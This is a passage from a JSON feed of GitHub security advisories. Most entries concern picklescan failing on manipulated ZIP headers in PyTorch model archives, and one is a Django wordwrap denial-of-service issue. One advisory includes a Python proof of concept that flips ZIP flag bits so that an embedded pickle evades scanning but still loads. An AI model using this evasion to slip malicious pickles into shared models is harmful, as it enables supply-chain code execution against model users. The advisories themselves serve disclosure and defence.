like Hugging Face.</p>\n</li>\n</ul>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ul>\n<li><p>Use a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.</p>\n</li>\n<li><p>Detect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.</p>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1944\">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7q5r-7gvp-wc82\">https://github.com/advisories/GHSA-7q5r-7gvp-wc82</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7q5r-7gvp-wc82",
            "title": "[picklescan] Zip Exploit Crashes Picklescan But Not PyTorch ",
            "date_modified": "2025-03-10T18:26:45.000Z",
            "date_published": "2025-03-10T18:26:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7q5r-7gvp-wc82"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>PickleScan fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>\n<h3 id=\"details\">Details</h3>\n<p>PickleScan relies on Python’s zipfile module to extract and scan files within ZIP-based model archives. However, certain flag bits in ZIP headers affect how files are interpreted, and some of these bits cause PickleScan to fail while leaving PyTorch’s loading mechanism unaffected.</p>\n<p>By modifying the flag_bits field in the ZIP file entry, an attacker can:</p>\n<ul>\n<li>Embed a malicious pickle file (bad_file.pkl) in a PyTorch model archive.</li>\n<li>Flip specific bits (e.g., 0x1, 0x20, 0x40) in the ZIP metadata.</li>\n<li>Prevent PickleScan from scanning the archive due to errors raised by zipfile.</li>\n<li>Successfully load the model with torch.load(), which ignores the flag modifications.</li>\n</ul>\n<p>This technique effectively bypasses PickleScan's security checks while maintaining model functionality.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import os\nimport zipfile\nimport torch\nfrom picklescan import cli\n\ndef can_scan(zip_file):\n    try:\n        cli.print_summary(False, cli.scan_file_path(zip_file))\n        return True\n    except Exception:\n        return False\n\nbit_to_flip = 0x1  # Change to 0x20 or 0x40 to test different flag bits\n\nzip_file = \"model.pth\"\nmodel = {'a': 1, 'b': 2, 'c': 3}\ntorch.save(model, zip_file)\n\nwith zipfile.ZipFile(zip_file, \"r\") as source:\n    flipped_name = f\"flipped_{bit_to_flip}_{zip_file}\"\n    with zipfile.ZipFile(flipped_name, \"w\") as dest:\n        bad_file = zipfile.ZipInfo(\"model/bad_file.pkl\")\n        \n        # Modify the ZIP flag bits\n        bad_file.flag_bits |= bit_to_flip\n        \n        dest.writestr(bad_file, b\"bad content\")\n        for item in source.infolist():\n            dest.writestr(item, source.read(item.filename))\n\nif model == torch.load(flipped_name, weights_only=False):\n    if not can_scan(flipped_name):\n        print('Found exploitable bit:', bit_to_flip)\nelse:\n    os.remove(flipped_name)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: <code>High</code></p>\n<ul>\n<li>Who is impacted? Any organization or user relying on PickleScan to detect malicious pickle files inside PyTorch models.</li>\n<li>What is the impact? Attackers can embed malicious pickle payloads inside PyTorch models that evade PickleScan's detection but still execute upon loading.</li>\n<li>Potential Exploits: This vulnerability could be exploited in machine learning supply chain attacks, allowing attackers to distribute backdoored models on platforms like Hugging Face or PyTorch Hub.</li>\n</ul>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ul>\n<li>Improve ZIP Handling: PickleScan should use a more relaxed ZIP parser marches on when encountering modified flag bits.</li>\n<li>Scan All Embedded Files Regardless of Flags: Ensure that files with altered metadata are still extracted and analyzed.</li>\n</ul>\n<p>By addressing these issues, PickleScan can provide stronger protection against manipulated PyTorch model archives.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1945\">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w8jq-xcqf-f792\">https://github.com/advisories/GHSA-w8jq-xcqf-f792</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w8jq-xcqf-f792",
            "title": "[picklescan] Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch",
            "date_modified": "2025-03-10T18:26:36.000Z",
            "date_published": "2025-03-10T18:26:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w8jq-xcqf-f792"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-w8jq-xcqf-f792. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>picklescan before 0.0.23 fails to detect malicious pickle files inside PyTorch model archives when certain ZIP file flag bits are modified. By flipping specific bits in the ZIP file headers, an attacker can embed malicious pickle files that remain undetected by PickleScan while still being successfully loaded by PyTorch's torch.load(). This can lead to arbitrary code execution when loading a compromised model.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-w8jq-xcqf-f792</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1945\">https://nvd.nist.gov/vuln/detail/CVE-2025-1945</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1945</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2fh4-gpch-vqv4\">https://github.com/advisories/GHSA-2fh4-gpch-vqv4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2fh4-gpch-vqv4",
            "title": "[picklescan] Duplicate Advisory: Zip Flag Bit Exploit Crashes Picklescan But Not PyTorch",
            "date_modified": "2025-03-10T18:31:04.000Z",
            "date_published": "2025-03-10T12:30:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2fh4-gpch-vqv4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-7q5r-7gvp-wc82. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>picklescan before 0.0.23 is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82\">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1944\">https://nvd.nist.gov/vuln/detail/CVE-2025-1944</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781\">https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781</a></li>\n<li><a href=\"https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944\">https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w6mr-mj53-x258\">https://github.com/advisories/GHSA-w6mr-mj53-x258</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w6mr-mj53-x258",
            "title": "[picklescan] Duplicate Advisory: Zip Exploit Crashes Picklescan But Not PyTorch ",
            "date_modified": "2025-03-10T18:25:49.000Z",
            "date_published": "2025-03-10T12:30:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w6mr-mj53-x258"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26699\">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/mar/06/security-releases\">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/06/12\">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3fp-8748-vqfq\">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq",
            "title": "[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling",
            "date_modified": "2025-03-06T22:35:39.000Z",
            "date_published": "2025-03-06T21:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.7, 5.0 before 5.0.13, and 4.2 before 4.2.20. The django.utils.text.wrap() method and wordwrap template filter are subject to a potential denial-of-service attack when used with very long strings.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26699\">https://nvd.nist.gov/vuln/detail/CVE-2025-26699</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/mar/06/security-releases\">https://www.djangoproject.com/weblog/2025/mar/06/security-releases</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/06/12\">http://www.openwall.com/lists/oss-security/2025/03/06/12</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3fp-8748-vqfq\">https://github.com/advisories/GHSA-p3fp-8748-vqfq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq",
            "title": "[Django] Django vulnerable to Allocation of Resources Without Limits or Throttling",
            "date_modified": "2025-03-06T22:35:39.000Z",
            "date_published": "2025-03-06T21:31:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3fp-8748-vqfq"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}